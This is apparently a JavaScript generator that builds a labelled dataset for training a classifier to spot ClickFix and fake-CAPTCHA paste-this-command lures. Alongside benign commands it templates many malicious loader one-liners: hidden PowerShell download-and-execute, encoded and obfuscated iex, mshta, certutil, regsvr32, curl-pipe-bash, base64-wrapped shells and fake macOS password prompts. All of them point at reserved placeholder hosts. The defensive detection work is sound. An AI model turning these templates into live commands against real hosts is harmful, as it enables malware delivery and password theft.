// Seeded generator for the classifier corpus.
//
// Malicious samples are grouped into families modelled on public ClickFix /
// fake-CAPTCHA reporting (loader choice, flags, decoys, obfuscation). Every
// address is reserved (RFC 5737 TEST-NET IPs) or uses made-up domains, so the
// strings are inert. Benign samples cover what people legitimately copy from
// web pages: developer and admin commands, official installer one-liners,
// prose, code, URLs and data.
//
// Families let the evaluation hold out a whole attack style and measure
// generalisation, instead of testing on near-duplicates of training data.

export function rng(seed) {
  let s = seed >>> 0;
  return () => {
    s = (s + 0x6d2b79f5) >>> 0;
    let t = s;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

export function generate({ seed = 1, perFamily = 160, benignCount = 2400 } = {}) {
  const r = rng(seed);
  const pick = (a) => a[Math.floor(r() * a.length)];
  const chance = (p) => r() < p;
  const int = (a, b) => a + Math.floor(r() * (b - a + 1));
  const word = () => pick(["update", "verify", "cdn", "check", "secure", "cloud", "files", "media", "static", "api",
    "captcha", "auth", "dl", "get", "sync", "edge", "portal", "docs", "assets", "help", "zoom", "teams", "drive"]);
  const tld = () => pick(["com", "net", "org", "io", "xyz", "top", "shop", "live", "icu", "site", "online", "click", "cfd", "info", "pro"]);
  const ip = () => `${pick(["192.0.2", "198.51.100", "203.0.113"])}.${int(1, 254)}`;
  const domain = () => `${word()}${chance(0.4) ? "-" + word() : ""}${chance(0.3) ? int(1, 99) : ""}.example.${tld()}`;
  const host = () => (chance(0.35) ? ip() : domain());
  const scheme = () => (chance(0.6) ? "https" : "http");
  const file = (exts) => `${pick(["a", "x", "s", "v", "run", "setup", "verify", "update", "check", "data", "c", "p"])}${chance(0.3) ? int(1, 999) : ""}.${pick(exts)}`;
  const url = (exts = ["ps1", "txt", "php", "dat", "bin", ""]) => {
    const f = file(exts.filter(Boolean).length ? exts : ["ps1"]);
    return `${scheme()}://${host()}${chance(0.3) ? ":" + pick([8080, 443, 8443, 80]) : ""}/${chance(0.4) ? word() + "/" : ""}${f.endsWith(".") ? f.slice(0, -1) : f}`;
  };
  const decoy = () => pick([
    `# ✅ I am not a robot - reCAPTCHA Verification ID: ${int(1000, 9999)}`,
    `# I'm not a robot: Cloudflare Ray ID ${int(10000000, 99999999).toString(16)}`,
    `# Human verification complete. Verification hash: ${int(1e5, 9e5)}`,
    `# ✔ Verified: press Enter to continue`,
  ]);
  const pad = () => " ".repeat(int(30, 120));
  const tail = (s) => (chance(0.45) ? `${s}${chance(0.6) ? pad() : " "}${decoy()}` : s);
  const randCase = (s) => (chance(0.25) ? s.split("").map((c) => (chance(0.5) ? c.toUpperCase() : c.toLowerCase())).join("") : s);
  const caret = (s) => s.replace(/([a-z])(?=[a-z])/gi, (m) => (chance(0.35) ? m + "^" : m));
  const tick = (s) => s.replace(/([a-z])(?=[a-z])/gi, (m) => (chance(0.3) ? m + "`" : m));
  const ps = () => randCase(pick(["powershell", "powershell.exe", "pwsh", "PowerShell", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"]));
  const hidden = () => pick(["-w h", "-w hidden", "-W Hidden", "-WindowStyle Hidden", "-win 1", "-w 1", "-wi mi"]);
  const opt = (s) => (chance(0.5) ? " " + s : "");
  const dl = () => pick(["iwr", "irm", "Invoke-WebRequest", "Invoke-RestMethod", "(New-Object Net.WebClient).DownloadString", "curl.exe -s", "wget"]);
  const enc16 = (s) => Buffer.from(s, "utf16le").toString("base64");
  const b64 = (s) => Buffer.from(s, "utf8").toString("base64");

  const psIex = () => {
    const u = url();
    return pick([
      `${dl()} '${u}' | iex`,
      `iex (${dl()} '${u}')`,
      `iex(${dl()}('${u}'))`,
      `${dl()} ${u} -UseBasicParsing | Invoke-Expression`,
      `$r=${dl()} '${u}'; iex $r`,
      `& ([scriptblock]::Create((${dl()} '${u}')))`,
    ]);
  };

  const families = {
    mshta: () => tail(`${pick(["mshta", "mshta.exe", "C:\\Windows\\System32\\mshta.exe", "MsHtA"])} ${url(["hta", "html", "php", ""])}`),
    ps_download_iex: () => tail(`${ps()}${opt(hidden())}${opt("-nop")}${opt("-ep bypass")} -c "${psIex()}"`),
    ps_encoded: () => `${ps()}${opt("-nop")} ${hidden()} ${pick(["-enc", "-e", "-EncodedCommand", "-ec"])} ${enc16(psIex())}`,
    ps_string_obfuscation: () => {
      const u = url();
      const iexs = pick([
        "&([char]105+[char]101+[char]120)", "&('{1}{0}' -f 'ex','i')", "&(('i','e','x') -join '')",
        "&('xei'[-1..-3] -join '')", "&($env:comspec[4,15,25]-join'')", ".($pshome[4]+$pshome[30]+'x')", "&('i'+'ex')",
      ]);
      return tail(`${ps()} ${hidden()} -c "${iexs}(${dl()} '${u}')"`);
    },
    cmd_temp_drop: () => {
      const f = file(["exe", "bat", "cmd", "scr"]);
      const dir = pick(["%TEMP%", "%APPDATA%", "%LOCALAPPDATA%", "%PUBLIC%", "C:\\ProgramData"]);
      return tail(`cmd /c ${pick(["curl -s -o", "curl -L -o", "curl.exe -k -o"])} ${dir}\\${f} ${url(["exe", "bin", "dat"])} ${pick(["&", "&&"])} ${pick(["start ", "start /min ", ""])}${dir}\\${f}`);
    },
    msiexec: () => tail(`msiexec ${pick(["/i", "/package", "/I"])} ${url(["msi", "dat", "bin"])} ${pick(["/qn", "/quiet", "/q", ""])}`),
    rundll_regsvr: () => tail(pick([
      `rundll32.exe ${pick(["javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:" + url(["sct", "js"]) + "')", "\\\\" + ip() + "\\share\\" + file(["dll"]) + ",DllRegisterServer"])}`,
      `regsvr32 /s /n /u /i:${url(["sct", "txt"])} scrobj.dll`,
    ])),
    certutil_bits: () => {
      const f = file(["exe", "bat"]);
      return tail(pick([
        `certutil -urlcache -split -f ${url(["exe", "txt", "b64"])} %TEMP%\\${f} && %TEMP%\\${f}`,
        `certutil.exe -urlcache -f ${url(["exe"])} ${f} & start ${f}`,
        `bitsadmin /transfer ${word()} /download /priority high ${url(["exe"])} %TEMP%\\${f} & start %TEMP%\\${f}`,
      ]));
    },
    finger: () => tail(`cmd /c finger ${pick(["verify", "user", "gw", "root"])}@${host()} | cmd`),
    lolbin_wrappers: () => tail(pick([
      `conhost.exe --headless ${ps()} -c "${psIex()}"`,
      `forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c ${ps()} -w h -c ${psIex()}"`,
      `cmd /c start /min ${ps()} ${hidden()} -c "${psIex()}"`,
      `explorer.exe "${url(["hta", "lnk"])}"`,
    ])),
    mac_curl_bash: () => pick([
      `curl -fsSL ${url(["sh", ""])} | bash`,
      `/bin/bash -c "$(curl -fsSL ${url(["sh"])})"`,
      `curl -s ${url(["sh"])} | ${pick(["sh", "zsh", "bash", "sudo bash"])}`,
      `cd /tmp && curl -O ${url(["sh", "bin"])} && chmod +x ${file(["sh", "bin"])} && ./${file(["sh", "bin"])}`,
      `wget -qO- ${url(["sh"])} | sh`,
    ]) + (chance(0.4) ? ` ${pick(["&", "&>/dev/null &", "; disown"])}` : ""),
    mac_base64: () => {
      const inner = `curl -s ${url(["sh"])} | ${pick(["bash", "sh", "zsh"])}`;
      return pick([
        `echo "${b64(inner)}" | base64 -d | bash`,
        `echo ${b64(inner)} | base64 --decode | sh`,
        `bash -c "$(echo ${b64(inner)} | base64 -D)"`,
      ]);
    },
    osascript_quarantine: () => pick([
      `osascript -e 'do shell script "curl -s ${url(["sh"])} | bash"'`,
      `osascript -e 'display dialog "macOS needs your password to continue" default answer "" with hidden answer'`,
      `curl -o /tmp/${file(["zip"])} ${url(["zip"])} && unzip -o /tmp/*.zip -d /tmp && xattr -c /tmp/${word()}.app && open /tmp/${word()}.app`,
      `xattr -d com.apple.quarantine /Applications/${word()}.app && open /Applications/${word()}.app`,
    ]),
    script_host_webdav: () => tail(pick([
      `cmd /c start \\\\${ip()}@SSL\\DavWWWRoot\\${file(["bat", "js", "vbs"])}`,
      `wscript.exe \\\\${ip()}\\${word()}\\${file(["js", "vbs"])}`,
      `cscript //nologo \\\\${host()}@8080\\DavWWWRoot\\${file(["vbs"])}`,
      `net use Z: \\\\${ip()}\\share && Z:\\${file(["exe", "bat"])}`,
    ])),
    other_interpreters: () => pick([
      `python3 -c "import urllib.request as u;exec(u.urlopen('${url(["py", "txt"])}').read())"`,
      `python -c "exec(__import__('urllib.request').request.urlopen('${url(["py"])}').read())"`,
      `perl -e 'use LWP::Simple; eval(get("${url(["pl"])}"))'`,
      `node -e "require('https').get('${url(["js"])}',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})"`,
      `ruby -e "eval(Net::HTTP.get(URI('${url(["rb"])}')))"`,
    ]),
  };

  // Light extra obfuscation on a share of Windows samples, as real lures vary.
  const winFamilies = new Set(["mshta", "ps_download_iex", "cmd_temp_drop", "msiexec", "certutil_bits", "finger", "lolbin_wrappers"]);

  const malicious = [];
  for (const [family, make] of Object.entries(families)) {
    for (let i = 0; i < perFamily; i++) {
      let t = make();
      if (winFamilies.has(family)) {
        const k = r();
        if (k < 0.12) t = caret(t);
        else if (k < 0.2 && /powershell|pwsh/i.test(t)) t = tick(t);
      }
      malicious.push({ text: t, label: 1, family });
    }
  }

  // --- benign ------------------------------------------------------------------
  const pkg = () => pick(["express", "react", "lodash", "requests", "numpy", "pandas", "flask", "django", "axios", "typescript",
    "vite", "pytest", "black", "ruff", "fastapi", "torch", "scikit-learn", "jest", "eslint", "prettier", "next", "vue"]);
  const repo = () => `https://github.com/${pick(["torvalds", "microsoft", "facebook", "samdem-ai", "rust-lang", "python", "nodejs", "vercel"])}/${pick(["linux", "vscode", "react", "portfolio", "rust", "cpython", "node", "next.js"])}.git`;
  const realHost = () => pick(["github.com", "example.com", "docs.python.org", "nodejs.org", "kubernetes.io", "stackoverflow.com",
    "developer.mozilla.org", "learn.microsoft.com", "wikipedia.org", "npmjs.com", "pypi.org"]);
  const sentence = () => pick([
    "The meeting has been moved to Thursday at 3pm.", "Please review the attached quarterly report before Friday.",
    "Thanks for your help with the migration last week!", "Our office will be closed on Monday for the holiday.",
    "Can you send me the latest version of the slides?", "The build failed because of a missing dependency.",
    "Remember to rotate the API keys every 90 days.", "To verify your email, click the link we sent you.",
    "Press Ctrl + V to paste the text into the document.", "Open the terminal and navigate to your project folder.",
    "I'm not a robot checkbox appears on the login form.", "Run the tests before you open a pull request.",
  ]);
  const benignMakers = [
    () => `npm install ${chance(0.5) ? "--save-dev " : ""}${pkg()}`,
    () => `pip install ${pkg()}${chance(0.3) ? "==" + int(1, 5) + "." + int(0, 20) + ".0" : ""}`,
    () => `git clone ${repo()}`,
    () => pick(["git status", "git pull --rebase", "git log --oneline -n 20", `git checkout -b feature/${word()}`, "git commit -m \"fix: typo\"", "git push origin main"]),
    () => pick(["docker compose up -d", `docker run -it --rm ${pick(["ubuntu", "node:22", "python:3.12"])} bash`, "docker ps -a", `docker build -t ${word()} .`]),
    () => pick(["kubectl get pods -A", `kubectl logs -f deploy/${word()}`, "kubectl apply -f deployment.yaml", "helm repo update"]),
    () => pick(["cargo build --release", "go mod tidy", "make -j8", "cmake -S . -B build", "dotnet run", "mvn clean install"]),
    () => pick(["sudo apt update && sudo apt upgrade -y", `sudo apt install -y ${pick(["nginx", "git", "curl", "htop"])}`, `brew install ${pick(["wget", "node", "python", "jq"])}`, `winget install --id ${pick(["Git.Git", "Microsoft.VisualStudioCode", "Python.Python.3.12"])} -e`]),
    () => pick(["choco install git -y", "scoop install nodejs", "sudo pacman -Syu", "sudo dnf install podman"]),
    // official installers that legitimately fetch-and-run over HTTPS
    () => pick([
      "curl -fsSL https://get.docker.com | sh",
      "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh",
      '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"',
      "curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | bash",
      "curl -fsSL https://deno.land/install.sh | sh",
      "curl -fsSL https://bun.sh/install | bash",
      "curl -LsSf https://astral.sh/uv/install.sh | sh",
      "curl -fsSL https://ollama.com/install.sh | sh",
      "irm get.scoop.sh | iex",
      "powershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"",
      "irm https://deno.land/install.ps1 | iex",
    ]),
    () => pick(["Get-Process | Sort-Object CPU -Descending | Select-Object -First 10", "Get-ChildItem -Recurse -Filter *.log",
      "Set-ExecutionPolicy RemoteSigned -Scope CurrentUser", "Install-Module -Name PSReadLine -Force", "Test-NetConnection github.com -Port 443",
      "Get-Service | Where-Object Status -eq 'Running'", "powershell -ExecutionPolicy Bypass -File .\\build.ps1", "Get-FileHash .\\setup.exe -Algorithm SHA256"]),
    () => pick(["ipconfig /all", "sfc /scannow", "netsh wlan show profiles", "ping -n 4 8.8.8.8", "dir /s *.txt", "tasklist /v", "chkdsk C: /f", "DISM /Online /Cleanup-Image /RestoreHealth"]),
    () => pick(["systemctl status nginx", "journalctl -u ssh -f", "ps aux | grep python", "df -h", "du -sh *", "tail -f /var/log/syslog",
      `curl -I https://${realHost()}`, `wget https://${realHost()}/files/report.pdf`, `ssh user@${realHost()}`, "rsync -avz ./dist/ server:/var/www/",
      "find . -name '*.py' | xargs grep -n TODO", "chmod +x ./scripts/deploy.sh && ./scripts/deploy.sh"]),
    () => pick(["python -m venv .venv && source .venv/bin/activate", "python3 manage.py runserver", "uvicorn main:app --reload", "node server.js", "npx create-next-app@latest my-app"]),
    () => sentence(),
    () => `${sentence()} ${sentence()}`,
    () => `https://${realHost()}/${pick(["docs", "blog", "questions", "wiki", "en-US/docs"])}/${int(1, 99999)}`,
    () => pick(["const total = items.reduce((a, b) => a + b.price, 0);", "for i in range(10):\n    print(i)", "SELECT id, name FROM users WHERE active = 1;",
      "def add(a, b):\n    return a + b", "export default function App() { return <div />; }", "{\"name\": \"demo\", \"version\": \"1.0.0\"}",
      "import pandas as pd\ndf = pd.read_csv('data.csv')", "fetch('/api/items').then((r) => r.json())"]),
    () => pick([`${word()}@${realHost()}`, `+213 5${int(10, 99)} ${int(100, 999)} ${int(100, 999)}`, `Order #${int(100000, 999999)}`, `${int(1, 28)}/${int(1, 12)}/2026`]),
    // Same address generator as the malicious families, so the model cannot
    // separate classes by "looks like a test domain/IP" and must learn structure.
    () => pick([
      `curl -I ${url(["html", "json", ""])}`, `curl -s ${url(["json"])} | jq .`, `wget ${url(["pdf", "zip", "tar.gz"])}`,
      `ssh admin@${ip()}`, `ping ${host()}`, `nslookup ${domain()}`, `scp backup.tar.gz user@${ip()}:/srv/`,
      `git clone ${scheme()}://${domain()}/${word()}/${word()}.git`, `docker pull ${domain()}/${word()}:latest`,
      `Invoke-WebRequest -Uri ${url(["zip", "pdf"])} -OutFile .\\${file(["zip", "pdf"])}`,
      `Test-NetConnection ${host()} -Port ${pick([22, 80, 443, 3389])}`, `curl -o report.pdf ${url(["pdf"])}`,
      `npm config set registry ${scheme()}://${domain()}/`, `pip install --index-url ${scheme()}://${domain()}/simple ${pkg()}`,
      `Check the dashboard at ${url(["html", ""])} before the meeting.`, `nmap -sV ${ip()}`, `traceroute ${host()}`,
    ]),
  ];
  const benign = [];
  for (let i = 0; i < benignCount; i++) {
    const k = i % benignMakers.length;
    benign.push({ text: benignMakers[k](), label: 0, family: `benign_${k}` });
  }
  return { malicious, benign };
}
